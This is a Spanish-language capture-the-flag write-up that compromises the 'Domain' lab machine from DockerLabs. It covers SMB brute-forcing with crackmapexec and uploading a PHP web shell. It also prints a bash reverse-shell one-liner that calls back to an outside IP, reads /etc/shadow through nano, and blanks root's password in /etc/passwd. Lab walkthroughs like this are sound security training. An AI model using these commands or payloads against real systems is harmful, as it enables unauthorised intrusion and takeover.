---
title: "Domain Writeup - DockerLabs"
date: 2024-05-01
categories: [Writeups, DockersLabs, Easy]
tags: [Linux, Easy, Domain, Dockerlabs, privesc, smb, nano, port, revshell]
image:
   path: /assets/img/posts/domain/banner.png
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
   alt: Banner Domain
---

| Información |
|------------|------------|------------|
| Máquina: Domain |
| Creador: El Pingüino de Mario |
| SO: Linux |
| Dificultad: Easy |

<hr>
Esta máquina está alojada en [DockersLabs](https://dockerlabs.es), una nueva plataforma creada por [ElPingüinoDeMario](https://www.linkedin.com/in/maalfer1/) con un concepto diferente al que estamos acostumbrados, en lugar de conectarnos a una vpn o virtualizar una máquina se realiza la conexión a la máquina vulnerable a través de Docker, pudiendo correr en la propia máquina atacante la víctima, una muy buena idea para ahorrar recursos.

El tutorial para poder realizar estas máquinas se encuentra [aquí](https://dockerlabs.es/assets/instrucciones_de_uso.pdf)
<hr>
Comenzamos realizando un ping para confirmar visibilidad entre máquinas

![](/assets/img/posts/domain/ping.png)

Realizamos un nmap para descubrir que servicios están corriendo en la máquina

![](/assets/img/posts/domain/nmap.png)

Vemos que hay un servidor web Apache y un servidor samba corriendo.

![](/assets/img/posts/domain/web.png)
>Samba es una suite de aplicaciones Unix que habla el protocolo SMB (Server Message Block). Los sistemas operativos Microsoft Windows y OS/2 utilizan SMB para compartir por red archivos e impresoras y para realizar tareas asociadas.
{:.prompt-info }

En la web nos encontramos una breve explicación de qué es samba y para qué se usa.

Realizo un fuzzeo en busca de directorios, subdirectorios y subdominios interesantes pero sin éxito.

Nos centramos en el servidor smb, lanzamos enum4linux, para una posible enumeración de usuarios

``` zsh
enum4linux 172.17.0.2
```

![](/assets/img/posts/domain/users.png)

Descubrimos dos usuarios: James y Bob

Creamos un diccionario con los dos nombres para realizar fuerza bruta con crackmapexec

```zsh
crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
-----------------------------------------------------------------------------------
SMB         172.17.0.2      445    86B2D8C57A0E     [+] 86B2D8C57A0E\bob:star 
```

Conseguimos las credenciales para bob:
`bob@star`

```zsh
smbmap -H 172.17.0.2 -u 'bob' -p 'star'
```

![](/assets/img/posts/domain/permisos.png)

Nos encontramos con que bob tiene permisos para modificar la carpeta html del servidor Apache, vamos a intentar subir un archivo PHP para realizar RCE.

Para acceder al recurso en el servidor smb usamos el comando:

```zsh
smbclient //172.17.0.2/html -U bob
```

![](/assets/img/posts/domain/smbclient.png)

Hacemos una pequeña prueba subiendo un archivo con el comando 'put'

![](/assets/img/posts/domain/put.png)

Llamamos al archivo y comprobamos que funciona correctamente

![](/assets/img/posts/domain/pwned.png)

Modificamos nuestro archivo `rce.php` subiendo un cmd para realizar el RCE

```php
<?php
        system($_GET['cmd']);
?>
```

Volvemos a realizar la comprobación:

![](/assets/img/posts/domain/cmd.png)

Procedemos a enviar una [revshell](https://www.revshells.com/)

```zsh
bash -c "bash -i >%26 /dev/tcp/192.168.0.84/4444 0>%261"
```

![](/assets/img/posts/domain/revshell.png)

Conseguimos una shell como el usuario www-data, nos cambiamos al usuario bob y comprobamos los privilegios.

![](/assets/img/posts/domain/subob.png)
![](/assets/img/posts/domain/find.png)

Pruebo a leer el /etc/shadow desde nano con este procedimiento de [GTFObins](https://gtfobins.github.io/gtfobins/nano)

![](/assets/img/posts/domain/gtfobins.png)

![](/assets/img/posts/domain/denied.png)

No somos capaces de leerlo, sin embargo haciendo la llamada directamente con el binario sí somos capaces de leer el shadow.

![](/assets/img/posts/domain/shadow.png)

Sin embargo se puede comprobar que el inicio de sesión con contraseña está desactivado para root 

![](/assets/img/posts/domain/root.png)

Vamos al fichero /etc/passwd:

![](/assets/img/posts/domain/passwd.png)

Eliminamos la x, dejando al usuario root de la siguiente forma:

```zsh
root::0:0:root:/root:/bin/bash
```

Después  de este proceso con el comando `su root` ya tendremos permisos como root y habremos vulnerado la máquina.



